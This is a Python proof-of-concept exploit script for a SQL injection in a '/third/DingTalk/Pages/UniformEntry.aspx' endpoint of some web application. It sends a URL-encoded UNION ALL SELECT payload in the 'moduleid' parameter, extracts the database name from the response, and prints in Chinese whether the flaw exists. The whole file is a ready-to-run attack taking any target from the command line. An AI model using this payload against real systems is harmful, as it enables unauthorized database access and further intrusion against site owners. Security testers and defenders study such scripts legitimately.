#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import zipfile
import random
import sys
import re
import requests

def verify(site):
    burp0_url = site + "/third/DingTalk/Pages/UniformEntry.aspx?moduleid=%31%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%64%62%5f%6e%61%6d%65%28%29%2c%4e%55%4c%4c--%20AoEG "
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept-Encoding": "gzip, deflate", "Accept": "*/*"}
    r = requests.post(burp0_url, headers=burp0_headers, verify=False)
    if "nvarchar" in r.text:
        patt = "'([^']+)'"

        dbname = re.findall(patt, r.text, re.I)
        if len(dbname) != 0:
            return dbname[0]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取数据库的名称为：", info)
    else:
        print("[-]漏洞不存在")
